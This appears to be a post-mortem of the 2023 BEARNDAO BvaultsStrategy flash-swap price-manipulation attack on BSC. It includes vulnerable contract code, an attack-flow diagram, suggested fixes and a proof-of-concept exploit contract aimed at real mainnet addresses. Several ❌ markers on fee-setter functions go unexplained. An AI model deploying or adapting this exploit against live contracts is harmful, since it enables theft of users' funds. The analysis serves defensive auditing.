# BEARNDAO convertDustToEarned Business Logic Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | BEARNDAO (BvaultsStrategy) |
| Date | 2023-12-01 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$769,000 USD |
| Attack Type | PancakeSwap Flash Swap + BvaultsStrategy.convertDustToEarned() Price Manipulation |
| CWE | CWE-840 (Business Logic Errors) |
| Attacker Address | `0xce27b195fa6de27081a86b98b64f77f5fb328dd5` |
| Attack Contract | `0xe1997bc971d5986aa57ee8ffb57eb1deba4fdaaa` |
| Vulnerable Contract | `0x21125d94cfe886e7179c8d2fe8c1ea8d57c73e0e` (BvaultsStrategy) |
| Fork Block | 34,099,688 |

## 2. Vulnerable Code Analysis

BEARNDAO's `BvaultsStrategy` contract performed auto-compounding operations in the `convertDustToEarned()` function based on the current ALPACA token price. The attacker borrowed WBNB via flash swap, artificially inflated the ALPACA price, then called `convertDustToEarned()` to calculate rewards at the inflated price and realize profits.

```solidity
// Vulnerable pattern: BvaultsStrategy.convertDustToEarned()
contract BvaultsStrategy {
    IERC20 public earnedToken; // ALPACA
    address public alpacaRouter; // PancakeSwap V1 Router

    // Vulnerable: converts dust using current spot price (manipulable)
    function convertDustToEarned() external {
        // Swaps dust (WBNB, BUSD, etc.) into ALPACA
        // Executed while swap price is manipulated → excess ALPACA obtained
        uint256 earnedAmt = _swapTokensForEarned(wbnbDust);
        // Manipulated earnedAmt used in compounding logic
        _farm(); // excess rewards distributed
    }
}
```

**Vulnerability**: `convertDustToEarned()` calculates the ALPACA amount based on the current pool price. If an attacker artificially inflates the WBNB → ALPACA price via flash swap and then calls this function, excess ALPACA can be obtained.

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: BvaultsStrategy.sol
    function convertDustToEarned() public whenNotPaused {  // ❌
        require(isAutoComp, "!isAutoComp");
        // Converts dust tokens into earned tokens, which will be reinvested on the next earn().

        // Converts token0 dust (if any) to earned tokens
        uint256 wantAmt = IERC20(wantAddress).balanceOf(address(this));
        if (wantAddress != earnedAddress && wantAmt > 0) {
            IERC20(wantAddress).safeIncreaseAllowance(uniRouterAddress, wantAmt);

            // Swap all dust tokens to earned tokens
            IPancakeRouter02(uniRouterAddress).swapExactTokensForTokensSupportingFeeOnTransferTokens(wantAmt, 0, paths[wantAddress][earnedAddress], address(this), now + 60);
            emit ConvertDustToEarned(wantAddress, earnedAddress, wantAmt);  // ❌
        }
    }

// ...

    function setEntranceFeeFactor(uint256 _entranceFeeFactor) external onlyOperator {
        require(_entranceFeeFactor > entranceFeeFactorLL, "BvaultsStrategy: !safe - too low");  // ❌
        require(_entranceFeeFactor <= entranceFeeFactorMax, "BvaultsStrategy: !safe - too high");  // ❌
        entranceFeeFactor = _entranceFeeFactor;
    }

// ...

    function setControllerFee(uint256 _controllerFee) external onlyOperator {
        require(_controllerFee <= controllerFeeUL, "BvaultsStrategy: too high");  // ❌
        controllerFee = _controllerFee;
    }

// ...

    function setBuyBackRate1(uint256 _buyBackRate1) external onlyOperator {
        require(buyBackRate1 <= buyBackRateUL, "BvaultsStrategy: too high");  // ❌
        buyBackRate1 = _buyBackRate1;
    }

// ...

    function setBuyBackRate2(uint256 _buyBackRate2) external onlyOperator {
        require(buyBackRate2 <= buyBackRateUL, "BvaultsStrategy: too high");  // ❌
        buyBackRate2 = _buyBackRate2;
    }
```

## 3. Attack Flow

```
Attacker [0xce27b195fa6de27081a86b98b64f77f5fb328dd5]
  │
  ├─1─▶ CAKE_WBNB.swap(0, 10,000 WBNB, address(this), data)
  │      [CAKE/WBNB: 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0]
  │      triggers pancakeCall callback
  │
  ├─2─▶ WBNB → ALPACA swap
  │      [PancakeRouter V1: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F]
  │      large WBNB → ALPACA buy → ALPACA price spikes
  │
  ├─3─▶ BvaultsStrategy.convertDustToEarned()
  │      [BvaultsStrategy: 0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e]
  │      dust converted at artificially inflated ALPACA price
  │      excess ALPACA obtained → compounding rewards distorted
  │
  ├─4─▶ ALPACA → WBNB reverse swap
  │      price normalized + profit realized
  │
  ├─5─▶ WBNB → BUSD swap
  │
  └─6─▶ flash swap repaid + ~$769K profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IBvaultsStrategy {
    function convertDustToEarned() external;
}

contract BEARNDAOExploit {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant ALPACA = IERC20(0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F);
    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    Uni_Pair_V2 constant CAKE_WBNB = Uni_Pair_V2(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    Uni_Router_V2 constant Router = Uni_Router_V2(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
    IBvaultsStrategy constant BvaultsStrategy = IBvaultsStrategy(0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e);

    function exploit() external {
        CAKE_WBNB.swap(0, 10_000 * 1e18, address(this), abi.encode(0));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        WBNB.approve(address(Router), type(uint256).max);
        ALPACA.approve(address(Router), type(uint256).max);

        // WBNB → ALPACA swap (price spike)
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(ALPACA);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // call convertDustToEarned at inflated ALPACA price
        BvaultsStrategy.convertDustToEarned();

        // ALPACA → WBNB reverse swap
        path[0] = address(ALPACA);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ALPACA.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // WBNB → BUSD
        path[0] = address(WBNB);
        path[1] = address(BUSD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)) - getRepayAmount(), 0, path, address(this), block.timestamp
        );

        // repay flash swap
        WBNB.transfer(address(CAKE_WBNB), getRepayAmount());
    }

    function getRepayAmount() internal view returns (uint256) {
        return 10_000 * 1e18 * 10000 / 9975 + 1;
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-840 (Business Logic Errors) |
| Vulnerability Type | convertDustToEarned() references current spot price → susceptible to price manipulation |
| Impact Scope | BEARNDAO BvaultsStrategy reward pool (~$769K) |
| Explorer | [BSCscan](https://bscscan.com/address/0x21125d94cfe886e7179c8d2fe8c1ea8d57c73e0e) |

## 6. Security Recommendations

```solidity
// Fix 1: Use TWAP-based pricing
function convertDustToEarned() external {
    // Use 30-minute TWAP instead of spot price
    uint256 twapPrice = getTWAPPrice(alpacaToken, wbnb, 1800);
    uint256 earnedAmt = dustAmount * twapPrice / 1e18;
    // ...
}

// Fix 2: Restrict convertDustToEarned calls (onlyKeeper)
modifier onlyKeeper() {
    require(msg.sender == keeper || msg.sender == owner, "Not keeper");
    _;
}

function convertDustToEarned() external onlyKeeper {
    // ...
}

// Fix 3: Detect intra-block price deviation
uint256 public lastConvertBlock;

function convertDustToEarned() external {
    require(block.number > lastConvertBlock + 10, "Too soon");
    lastConvertBlock = block.number;
    // Check price deviation
    uint256 currentPrice = getCurrentPrice();
    uint256 avgPrice = getRecentAvgPrice();
    require(
        currentPrice * 100 / avgPrice >= 95 && currentPrice * 100 / avgPrice <= 105,
        "Price manipulation detected"
    );
    // ...
}
```

## 7. Lessons Learned

1. **convertDustToEarned manipulation pattern**: When an auto-compounding/harvest function converts tokens based on the current spot price, an attacker can temporarily inflate the price via flash loan and then call the function to exploit it.
2. **PancakeRouter V1 price manipulation**: Price manipulation through BSC's PancakeSwap V1 router (`0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F`) is a recurring pattern across multiple BSC DeFi attacks.
3. **$769K large-scale compounding attack**: Vaults using auto-compounding strategies like BEARNDAO must pay special attention to price dependencies in harvest/compound functions during audits.
4. **Ancilia monitoring**: BSC DeFi attacks are quickly detected and analyzed by Ancilia (@AnciliaInc).